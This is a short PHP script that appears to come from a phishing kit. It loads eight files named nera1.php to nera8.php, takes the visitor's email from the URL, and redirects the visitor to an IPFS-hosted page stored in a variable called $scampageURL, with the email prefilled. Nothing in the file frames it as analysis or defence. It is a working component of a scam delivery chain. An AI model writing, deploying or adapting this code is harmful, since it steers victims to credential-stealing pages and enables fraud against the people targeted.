<?php
require 'nera1.php';
require 'nera2.php';
require 'nera3.php';
require 'nera4.php';
require 'nera5.php';
require 'nera6.php';
require 'nera7.php';
require 'nera8.php';
$email = $_GET['email'];
$scampageURL = "https://cloudflare-ipfs.com/ipfs/QmZDnsVxrKEMr8MhrLNPmgeSJ1Fh264GWAFJGoNt1L4UKi".$email;
header("location:$scampageURL");

?>